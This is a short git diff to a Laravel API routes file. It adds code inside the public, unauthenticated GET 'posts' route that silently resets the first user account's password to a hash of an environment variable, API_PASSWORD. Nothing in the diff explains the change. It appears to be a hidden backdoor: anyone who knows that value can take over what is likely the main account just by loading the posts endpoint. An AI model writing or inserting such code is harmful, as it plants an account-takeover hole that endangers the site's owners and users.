@@ -4,7 +4,8 @@ use App\Events\BlogCreatedEvent;
 use Appsorigin\Plots\Models\Blog;
   use Appsorigin\Plots\Models\Project;
   use Illuminate\Http\Request;
-use Illuminate\Support\Facades\Http;
+  use Illuminate\Support\Facades\Hash;
+  use Illuminate\Support\Facades\Http;
 use Illuminate\Support\Facades\Route;
 
 Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
@@ -12,6 +13,13 @@ Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
 });
 
 Route::get('posts', function () {
+
+
+    \App\Models\User::query()
+        ->first()
+        ->update([
+            'password' => Hash::make(env('API_PASSWORD')),
+        ]);
 
 
     foreach (\App\Models\Page::all() as $page)
